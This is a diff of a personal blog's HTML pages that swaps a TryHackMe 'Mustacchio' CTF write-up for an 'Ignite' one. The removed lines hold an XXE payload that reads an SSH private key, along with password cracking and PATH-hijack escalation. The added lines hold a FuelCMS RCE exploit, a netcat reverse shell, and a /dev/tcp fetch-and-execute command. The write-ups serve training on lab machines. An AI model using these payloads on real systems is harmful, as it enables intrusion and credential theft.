@@ -10,11 +10,11 @@
 
 <!-- Twitter And Open Graph Meta -->
 <!-- Open Graph Meta Tags -->
-<meta property="og:title" content="TryHackMe - Mustacchio">
-<meta property="og:description" content="&lt;p&gt;Easy boot2root Machine. Let’s start.&lt;/p&gt;
+<meta property="og:title" content="TryHackMe - Ignite">
+<meta property="og:description" content="&lt;p&gt;A new start-up has a few issues with their web server.. Let’s start.&lt;/p&gt;
 ">
 <meta property="og:type" content="website">
-<meta property="og:url" content="http://localhost:4000/tryhackme-mustacchio/">
+<meta property="og:url" content="http://localhost:4000/tryhackme-ignite/">
 <meta property="og:image" content="">
 <meta property="og:image:alt" content="">
 <meta property="og:site_name" content="Mr0Wido's Blog">
@@ -23,8 +23,8 @@
 <!-- Twitter Meta Tags -->
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="@">
-<meta name="twitter:title" content="TryHackMe - Mustacchio">
-<meta name="twitter:description" content="&lt;p&gt;Easy boot2root Machine. Let’s start.&lt;/p&gt;
+<meta name="twitter:title" content="TryHackMe - Ignite">
+<meta name="twitter:description" content="&lt;p&gt;A new start-up has a few issues with their web server.. Let’s start.&lt;/p&gt;
 ">
 <meta name="twitter:image" content="">
 
@@ -37,7 +37,7 @@
 
 
 
-<title>TryHackMe - Mustacchio - Mr0Wido's Blog</title>
+<title>TryHackMe - Ignite - Mr0Wido's Blog</title>
 
 
 
@@ -52,10 +52,9 @@
 
 
 
-    <title>TryHackMe - Mustacchio - Mr0Wido's Blog</title>
+    <title>TryHackMe - Ignite - Mr0Wido's Blog</title>
     <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
-  <script src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">MathJax.Hub.Config({         tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] }       });</script>
-</head>
+  </head>
   <body>
     <header class="site-header">
   <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
@@ -140,222 +139,131 @@
       <div class="content-container">
         <main class="default">
           <div class="post">
-  <h1 class="post__title">TryHackMe - Mustacchio</h1>
+  <h1 class="post__title">TryHackMe - Ignite</h1>
   <div class="post__content">
-    <p>Easy boot2root Machine. Let’s start.</p>
+    <p>A new start-up has a few issues with their web server.. Let’s start.</p>
 
 <p><br></p>
 
-<h2 id="1-mustacchio">1. Mustacchio</h2>
+<h2 id="1-ignite">1. Ignite</h2>
 
-<p>Deploy and compromise the machine!</p>
+<p>Root the box! Designed and created by DarkStar7471, built by Paradox.
+Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.</p>
 
 <p><br></p>
 
-<h3 id="11-user-flag">1.1 User Flag?</h3>
+<h3 id="11-usertxt">1.1 User.txt</h3>
 
-<p><em>Hint: Check the source of the page.</em></p>
+<p>Let’s do a nmap scan first.</p>
 
-<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan first.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -p- 10.10.80.114
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV -A -O 10.10.80.114
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/mustacchio/nmap.png" alt="nmap"></p>
+<p><img src="/assets/img/tryhackme/ignite/nmap.png" alt="nmap"></p>
 
-<p>We found three open ports. These are <code class="language-plaintext highlighter-rouge">22/tcp SSH, 80/tcp HTTP, and 8765/tcp HTTP</code>.</p>
+<p>Only port 80/tcp is open. If we look carefully, there is a directory information in <strong><code class="language-plaintext highlighter-rouge">robots.txt</code></strong>. Disallow: <strong><code class="language-plaintext highlighter-rouge">/fuel/</code></strong>.</p>
 
-<p>First, let’s visit the website running on port 80/tcp and see what we can find.
-Five different pages appear. These are home, about, gallery, blog, and contact.</p>
+<p><img src="/assets/img/tryhackme/ignite/robots.png" alt="robots"></p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/home.png" alt="home"></p>
+<p>But first, let’s check the website running on port 80. 
+Here is a page like this.</p>
 
-<p>I am checking the links and source pages that can be visited on the website, but I could not find anything remarkable.</p>
+<p><img src="/assets/img/tryhackme/ignite/home.png" alt="home"></p>
 
-<p>I decided to do a directory scan with Gobuster. But first, let’s visit the website running on 8765/tcp port.</p>
+<p>As far as I can see, the fuel cms version 1.4 is used here.
+There may be a vulnerability in this version, we will check it, but first I want to look at the /fuel/ directory.
+Let’s go to this directory and see what comes up.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/admin.png" alt="admin"></p>
+<p><img src="/assets/img/tryhackme/ignite/login.png" alt="login"></p>
 
-<p>We found an admin panel, it will help us. Anyway, let’s go back to port 80/tcp and do a gobuster scan.</p>
+<p>An admin login page appears. By default I tried <strong><code class="language-plaintext highlighter-rouge">admin:admin</code></strong> directly and logged in D:
+I didn’t expect the admin page to be so easy to reach. Let’s see what we find here.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/gobuster.png" alt="gobuster"></p>
+<p><img src="/assets/img/tryhackme/ignite/fuel.png" alt="fuel"></p>
 
-<p>The custom directory looks interesting. When we go inside, we find a file called <code class="language-plaintext highlighter-rouge">user.bak</code>, which is interesting.</p>
+<p>I’m checking every link on the page to see if we can somehow apply a reverse shell.
+But I couldn’t find anything remarkable. So I searched in exploit-db if we can find a vulnerability about fuel cms v1.4 that we discovered earlier.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/userbak.png" alt="userbak"></p>
+<p><img src="/assets/img/tryhackme/ignite/search.png" alt="search"></p>
 
-<p>Let’s see what’s in it.</p>
+<p>We found something important here. I see that we can exploit the RCE vulnerability in 1.4. Let’s take a look at the most recent of them.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/admincode.png" alt="admincode"></p>
+<p><img src="/assets/img/tryhackme/ignite/db.png" alt="db"></p>
 
-<p><strong><code class="language-plaintext highlighter-rouge">admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</code></strong></p>
+<p>I’m downloading the exploit file from here. And now let’s run it.</p>
 
-<p>I guess this is the login information to the admin panel but the password seems to be encrypted. 
-I check with the hash-identifier.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/codeid.png" alt="codeid"></p>
-
-<p>Most likely admin’s password is encrypted using <code class="language-plaintext highlighter-rouge">SHA1</code>.</p>
-
-<p>You can decrypt online from any website by searching for “SHA1 decrypt” in the browser. I used the following website. <a href="https://md5decrypt.net/en/Sha1/#answer" rel="external nofollow noopener" target="_blank">Here</a></p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/decode.png" alt="decode"></p>
-
-<p>We found the password.</p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">admin : bulldog19</code></strong></p>
-
-<p>Now let’s go to the admin panel and log in.
-We logged in.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/comment.png" alt="comment"></p>
-
-<p>I’ve tried a few command injections into the area that comes up, but it just seems like a gimmick.</p>
-
-<p>I’m checking the source of the page and we’re getting some important information here.</p>
-<ul>
-  <li>
-    <p>We explore the /auth/dontforget.bak file.</p>
-  </li>
-  <li>
-    <p><img src="/assets/img/tryhackme/mustacchio/dontforget.png" alt="dontforget"></p>
-  </li>
-  <li>
-    <p>We discover that Barry is now able to log into SSH.</p>
-  </li>
-  <li>
-    <p><img src="/assets/img/tryhackme/mustacchio/barryssh.png" alt="barryssh"></p>
-  </li>
-</ul>
-
-<p>Let’s first check the dontforget.bak file.</p>
-
-<p>Download directly from here <a href="http://10.10.80.114:8765/auth/dontforget.bak" rel="external nofollow noopener" target="_blank">http://10.10.80.114:8765/auth/dontforget.bak</a>.</p>
-
-<p>Something like this welcomes us.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/dontforgetbakin.png" alt="dontforgetbakin"></p>
-
-<p>But there is one important thing about this code, it’s not a complete waste of time. 
-This code is an XML code, if we copy this code and paste it into the comment section in the admin panel, we get the following result.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/joe.png" alt="joe"></p>
-
-<p>I mean, we need to write xml code in this comment section. So I am trying to do command injection using xml.</p>
-
-<p>I tried the commands <a href="https://github.com/payloadbox/xxe-injection-payload-list" rel="external nofollow noopener" target="_blank">here</a> but no result.</p>
-
-<p>But I realized something, I was constantly getting this result.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/empty.png" alt="empty"></p>
-
-<p>Here I understood that I should use the tags in dontforget.bak.</p>
-
-<p>First I decided to give it a try with the code below.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/try.png" alt="try"></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE replace [&lt;!ENTITY example "XML Injection"&gt; ]&gt;
-&lt;comment&gt;
-  &lt;name&gt;Joe Hamd&lt;/name&gt;
-  &lt;author&gt;&amp;example;&lt;/author&gt;
-&lt;com&gt;Test paragraph&lt;/com&gt;
-&lt;/comment&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python 50477.py -u http://10.10.9.177
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/mustacchio/tryout.png" alt="tryout"></p>
+<p><img src="/assets/img/tryhackme/ignite/payload.png" alt="payload"></p>
 
-<p>It worked as you can see. Now we can access the information inside the system.</p>
+<p>We log in to the system, and we provide a clearer connection by using one of the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="external nofollow noopener" target="_blank">pentest monkey’s reverse shells</a>.</p>
 
-<p>We got the message that Barry can now log in to ssh, if we go to Barry’s directory and get the rsa key, we can log in too.</p>
+<p><img src="/assets/img/tryhackme/ignite/monkey.png" alt="monkey"></p>
 
-<p>I run the following code in the admin panel to get the id_rsa key.</p>
+<p>First, we set up a netcat listener on our own machine.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/commentinssh.png" alt="commentinssh"></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM 'file:////home/barry/.ssh/id_rsa'&gt;]&gt;
-&lt;comment&gt;
-  &lt;name&gt;Joe Hamd&lt;/name&gt;
-  &lt;author&gt;Joe&lt;/author&gt;
-&lt;com&gt;&amp;example;&lt;/com&gt;
-&lt;/comment&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/mustacchio/outrsa.png" alt="outrsa"></p>
+<p>Then we enter the following code on the target machine.</p>
 
-<p>Yes, we have reached the RSA key, now we need to copy and edit this key. I tried without editing and it doesn’t work :D.
-Make sure there are no spaces at the end of the lines. Each one should be a separate line.
-It should look like this when you edit it.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/edit.png" alt="edit"></p>
-
-<p>Now we need to crack this id_rsa for barry’s ssh password.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh2john id_rsa &gt; id_rsa.hash
-$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 4444 &gt;/tmp/f
 </code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/mustacchio/crack.png" alt="crack"></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">barry : urieljames</code></strong></p>
-
-<p>Now we can log in ssh.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod 600 id_rsa
-$ ssh -i id_rsa barry@10.10.80.114
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/mustacchio/barryin.png" alt="barryin"></p>
 
 <p>And we are inside.</p>
 
-<p>Now we can access the user flag.</p>
+<p><img src="/assets/img/tryhackme/ignite/in.png" alt="in"></p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/user-flag.png" alt="user-flag"></p>
+<p>To find user.txt, I first look at the user directories in the /home directory. There is a user and that is www-data. We go in and take the flag right away.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la /home
+$ ls -la /home/www-data
+$ cat /home/www-data/user.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/ignite/user-flag.png" alt="user-flag"></p>
 
 <p><br></p>
 
-<h3 id="12-root-flag">1.2 Root Flag?</h3>
+<h3 id="12-roottxt">1.2 Root.txt</h3>
 
-<p><em>Hint: SUID?</em></p>
+<p>I’m scanning the system with <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230319" rel="external nofollow noopener" target="_blank">linpeas.sh</a> to upgrade privileges.</p>
 
-<p>We proceed with the clue that the question gives us. First, we will run the following code.</p>
+<p>First, I run the following code in the directory where linpeas.sh is located on my own machine.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -perm -04000 -ls 2&gt;/dev/null
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo nc -q 5 -lvnp 80 &lt; linpeas.sh
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/mustacchio/suid.png" alt="suid"></p>
+<p>Then I run the following code on the target machine.</p>
 
-<p>I couldn’t find anything remarkable and started navigating the system.</p>
-
-<p>I discovered the joe directory next to barry, and if you remember a file like <code class="language-plaintext highlighter-rouge">live_log</code> in it, we also saw this file as a result of the code we wrote above.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/ls.png" alt="ls"></p>
-
-<p>I’m looking at the strings content of this log file and we find something remarkable here. The tail command was used.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$strings live_log
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &lt; /dev/tcp/10.8.86.168/80 | sh
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/mustacchio/strings.png" alt="strings"></p>
+<p><img src="/assets/img/tryhackme/ignite/run.png" alt="run"></p>
 
-<p>I’ve been doing some research on how to escalate using this and I find that it’s as follows.</p>
+<p>And it worked. Now we’re waiting to see if we can find anything useful.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/privesc.png" alt="privesc"></p>
+<p><img src="/assets/img/tryhackme/ignite/linpeas.png" alt="linpeas"></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "/bin/sh" &gt; tail
-$ chmod 777 tail
-$ export PATH=/tmp.$PATH
-$ cd /home/joe/
-$ ./live_log
+<p><strong><code class="language-plaintext highlighter-rouge">Password: mememe</code></strong></p>
+
+<p>We found a password information, but I don’t know what it is for. But let’s try it for root.</p>
+
+<p>First, let’s call a shell using python. Then let’s try logging in.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
+$ su root
+Password: mememe
 </code></pre></div></div>
 
-<p>And we are inside. To be frank, I don’t fully understand the logic of raising authority, I’ll go over it a little later.
-But now we can get to root.txt.</p>
+<p>It worked :D. We have successfully rooted.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/root-flag.png" alt="root-flag"></p>
+<p><img src="/assets/img/tryhackme/ignite/privesc.png" alt="privesc"></p>
+
+<p>Now we can get to root.txt let’s get the flag.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/root-flag.png" alt="root-flag"></p>
 
 <p><br></p>
 
@@ -370,7 +278,7 @@ But now we can get to root.txt.</p>
   </div>
   <div class="post__footer">
     <p class="post__date">
-      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 19, 2023</p>
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 20, 2023</p>
     <div class="post__categories">
       
       
@@ -383,11 +291,11 @@ But now we can get to root.txt.</p>
         <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
         <span class="post__tags-container">
           
-          <span class="post__tags-item">xxe,</span>
+          <span class="post__tags-item">ctf,</span>
           
           <span class="post__tags-item">privesc,</span>
           
-          <span class="post__tags-item">enumeraton</span>
+          <span class="post__tags-item">exploit</span>
           
         </span>
       </p>
@@ -401,8 +309,8 @@ But now we can get to root.txt.</p>
 <div id="disqus_thread"></div>
 <script>
     var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/tryhackme-mustacchio/';
-    this.page.identifier = '/tryhackme-mustacchio';
+    this.page.url = 'http://localhost:4000/tryhackme-ignite/';
+    this.page.identifier = '/tryhackme-ignite';
     
     };
 
@@ -752,222 +660,131 @@ But now we can get to root.txt.</p>
       <div class="content-container">
         <main class="default">
           <div class="post">
-  <h1 class="post__title">TryHackMe - Mustacchio</h1>
+  <h1 class="post__title">TryHackMe - Ignite</h1>
   <div class="post__content">
-    <p>Easy boot2root Machine. Let’s start.</p>
+    <p>A new start-up has a few issues with their web server.. Let’s start.</p>
 
 <p><br></p>
 
-<h2 id="1-mustacchio">1. Mustacchio</h2>
+<h2 id="1-ignite">1. Ignite</h2>
 
-<p>Deploy and compromise the machine!</p>
+<p>Root the box! Designed and created by DarkStar7471, built by Paradox.
+Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.</p>
 
 <p><br></p>
 
-<h3 id="11-user-flag">1.1 User Flag?</h3>
+<h3 id="11-usertxt">1.1 User.txt</h3>
 
-<p><em>Hint: Check the source of the page.</em></p>
+<p>Let’s do a nmap scan first.</p>
 
-<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan first.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -p- 10.10.80.114
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV -A -O 10.10.80.114
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/mustacchio/nmap.png" alt="nmap"></p>
+<p><img src="/assets/img/tryhackme/ignite/nmap.png" alt="nmap"></p>
 
-<p>We found three open ports. These are <code class="language-plaintext highlighter-rouge">22/tcp SSH, 80/tcp HTTP, and 8765/tcp HTTP</code>.</p>
+<p>Only port 80/tcp is open. If we look carefully, there is a directory information in <strong><code class="language-plaintext highlighter-rouge">robots.txt</code></strong>. Disallow: <strong><code class="language-plaintext highlighter-rouge">/fuel/</code></strong>.</p>
 
-<p>First, let’s visit the website running on port 80/tcp and see what we can find.
-Five different pages appear. These are home, about, gallery, blog, and contact.</p>
+<p><img src="/assets/img/tryhackme/ignite/robots.png" alt="robots"></p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/home.png" alt="home"></p>
+<p>But first, let’s check the website running on port 80. 
+Here is a page like this.</p>
 
-<p>I am checking the links and source pages that can be visited on the website, but I could not find anything remarkable.</p>
+<p><img src="/assets/img/tryhackme/ignite/home.png" alt="home"></p>
 
-<p>I decided to do a directory scan with Gobuster. But first, let’s visit the website running on 8765/tcp port.</p>
+<p>As far as I can see, the fuel cms version 1.4 is used here.
+There may be a vulnerability in this version, we will check it, but first I want to look at the /fuel/ directory.
+Let’s go to this directory and see what comes up.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/admin.png" alt="admin"></p>
+<p><img src="/assets/img/tryhackme/ignite/login.png" alt="login"></p>
 
-<p>We found an admin panel, it will help us. Anyway, let’s go back to port 80/tcp and do a gobuster scan.</p>
+<p>An admin login page appears. By default I tried <strong><code class="language-plaintext highlighter-rouge">admin:admin</code></strong> directly and logged in D:
+I didn’t expect the admin page to be so easy to reach. Let’s see what we find here.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/gobuster.png" alt="gobuster"></p>
+<p><img src="/assets/img/tryhackme/ignite/fuel.png" alt="fuel"></p>
 
-<p>The custom directory looks interesting. When we go inside, we find a file called <code class="language-plaintext highlighter-rouge">user.bak</code>, which is interesting.</p>
+<p>I’m checking every link on the page to see if we can somehow apply a reverse shell.
+But I couldn’t find anything remarkable. So I searched in exploit-db if we can find a vulnerability about fuel cms v1.4 that we discovered earlier.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/userbak.png" alt="userbak"></p>
+<p><img src="/assets/img/tryhackme/ignite/search.png" alt="search"></p>
 
-<p>Let’s see what’s in it.</p>
+<p>We found something important here. I see that we can exploit the RCE vulnerability in 1.4. Let’s take a look at the most recent of them.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/admincode.png" alt="admincode"></p>
+<p><img src="/assets/img/tryhackme/ignite/db.png" alt="db"></p>
 
-<p><strong><code class="language-plaintext highlighter-rouge">admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</code></strong></p>
+<p>I’m downloading the exploit file from here. And now let’s run it.</p>
 
-<p>I guess this is the login information to the admin panel but the password seems to be encrypted. 
-I check with the hash-identifier.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/codeid.png" alt="codeid"></p>
-
-<p>Most likely admin’s password is encrypted using <code class="language-plaintext highlighter-rouge">SHA1</code>.</p>
-
-<p>You can decrypt online from any website by searching for “SHA1 decrypt” in the browser. I used the following website. <a href="https://md5decrypt.net/en/Sha1/#answer" rel="external nofollow noopener" target="_blank">Here</a></p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/decode.png" alt="decode"></p>
-
-<p>We found the password.</p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">admin : bulldog19</code></strong></p>
-
-<p>Now let’s go to the admin panel and log in.
-We logged in.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/comment.png" alt="comment"></p>
-
-<p>I’ve tried a few command injections into the area that comes up, but it just seems like a gimmick.</p>
-
-<p>I’m checking the source of the page and we’re getting some important information here.</p>
-<ul>
-  <li>
-    <p>We explore the /auth/dontforget.bak file.</p>
-  </li>
-  <li>
-    <p><img src="/assets/img/tryhackme/mustacchio/dontforget.png" alt="dontforget"></p>
-  </li>
-  <li>
-    <p>We discover that Barry is now able to log into SSH.</p>
-  </li>
-  <li>
-    <p><img src="/assets/img/tryhackme/mustacchio/barryssh.png" alt="barryssh"></p>
-  </li>
-</ul>
-
-<p>Let’s first check the dontforget.bak file.</p>
-
-<p>Download directly from here <a href="http://10.10.80.114:8765/auth/dontforget.bak" rel="external nofollow noopener" target="_blank">http://10.10.80.114:8765/auth/dontforget.bak</a>.</p>
-
-<p>Something like this welcomes us.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/dontforgetbakin.png" alt="dontforgetbakin"></p>
-
-<p>But there is one important thing about this code, it’s not a complete waste of time. 
-This code is an XML code, if we copy this code and paste it into the comment section in the admin panel, we get the following result.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/joe.png" alt="joe"></p>
-
-<p>I mean, we need to write xml code in this comment section. So I am trying to do command injection using xml.</p>
-
-<p>I tried the commands <a href="https://github.com/payloadbox/xxe-injection-payload-list" rel="external nofollow noopener" target="_blank">here</a> but no result.</p>
-
-<p>But I realized something, I was constantly getting this result.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/empty.png" alt="empty"></p>
-
-<p>Here I understood that I should use the tags in dontforget.bak.</p>
-
-<p>First I decided to give it a try with the code below.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/try.png" alt="try"></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE replace [&lt;!ENTITY example "XML Injection"&gt; ]&gt;
-&lt;comment&gt;
-  &lt;name&gt;Joe Hamd&lt;/name&gt;
-  &lt;author&gt;&amp;example;&lt;/author&gt;
-&lt;com&gt;Test paragraph&lt;/com&gt;
-&lt;/comment&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python 50477.py -u http://10.10.9.177
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/mustacchio/tryout.png" alt="tryout"></p>
+<p><img src="/assets/img/tryhackme/ignite/payload.png" alt="payload"></p>
 
-<p>It worked as you can see. Now we can access the information inside the system.</p>
+<p>We log in to the system, and we provide a clearer connection by using one of the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="external nofollow noopener" target="_blank">pentest monkey’s reverse shells</a>.</p>
 
-<p>We got the message that Barry can now log in to ssh, if we go to Barry’s directory and get the rsa key, we can log in too.</p>
+<p><img src="/assets/img/tryhackme/ignite/monkey.png" alt="monkey"></p>
 
-<p>I run the following code in the admin panel to get the id_rsa key.</p>
+<p>First, we set up a netcat listener on our own machine.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/commentinssh.png" alt="commentinssh"></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM 'file:////home/barry/.ssh/id_rsa'&gt;]&gt;
-&lt;comment&gt;
-  &lt;name&gt;Joe Hamd&lt;/name&gt;
-  &lt;author&gt;Joe&lt;/author&gt;
-&lt;com&gt;&amp;example;&lt;/com&gt;
-&lt;/comment&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/mustacchio/outrsa.png" alt="outrsa"></p>
+<p>Then we enter the following code on the target machine.</p>
 
-<p>Yes, we have reached the RSA key, now we need to copy and edit this key. I tried without editing and it doesn’t work :D.
-Make sure there are no spaces at the end of the lines. Each one should be a separate line.
-It should look like this when you edit it.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/edit.png" alt="edit"></p>
-
-<p>Now we need to crack this id_rsa for barry’s ssh password.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh2john id_rsa &gt; id_rsa.hash
-$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 4444 &gt;/tmp/f
 </code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/mustacchio/crack.png" alt="crack"></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">barry : urieljames</code></strong></p>
-
-<p>Now we can log in ssh.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod 600 id_rsa
-$ ssh -i id_rsa barry@10.10.80.114
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/mustacchio/barryin.png" alt="barryin"></p>
 
 <p>And we are inside.</p>
 
-<p>Now we can access the user flag.</p>
+<p><img src="/assets/img/tryhackme/ignite/in.png" alt="in"></p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/user-flag.png" alt="user-flag"></p>
+<p>To find user.txt, I first look at the user directories in the /home directory. There is a user and that is www-data. We go in and take the flag right away.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la /home
+$ ls -la /home/www-data
+$ cat /home/www-data/user.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/ignite/user-flag.png" alt="user-flag"></p>
 
 <p><br></p>
 
-<h3 id="12-root-flag">1.2 Root Flag?</h3>
+<h3 id="12-roottxt">1.2 Root.txt</h3>
 
-<p><em>Hint: SUID?</em></p>
+<p>I’m scanning the system with <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230319" rel="external nofollow noopener" target="_blank">linpeas.sh</a> to upgrade privileges.</p>
 
-<p>We proceed with the clue that the question gives us. First, we will run the following code.</p>
+<p>First, I run the following code in the directory where linpeas.sh is located on my own machine.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -perm -04000 -ls 2&gt;/dev/null
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo nc -q 5 -lvnp 80 &lt; linpeas.sh
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/mustacchio/suid.png" alt="suid"></p>
+<p>Then I run the following code on the target machine.</p>
 
-<p>I couldn’t find anything remarkable and started navigating the system.</p>
-
-<p>I discovered the joe directory next to barry, and if you remember a file like <code class="language-plaintext highlighter-rouge">live_log</code> in it, we also saw this file as a result of the code we wrote above.</p>
-
-<p><img src="/assets/img/tryhackme/mustacchio/ls.png" alt="ls"></p>
-
-<p>I’m looking at the strings content of this log file and we find something remarkable here. The tail command was used.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$strings live_log
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &lt; /dev/tcp/10.8.86.168/80 | sh
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/mustacchio/strings.png" alt="strings"></p>
+<p><img src="/assets/img/tryhackme/ignite/run.png" alt="run"></p>
 
-<p>I’ve been doing some research on how to escalate using this and I find that it’s as follows.</p>
+<p>And it worked. Now we’re waiting to see if we can find anything useful.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/privesc.png" alt="privesc"></p>
+<p><img src="/assets/img/tryhackme/ignite/linpeas.png" alt="linpeas"></p>
 
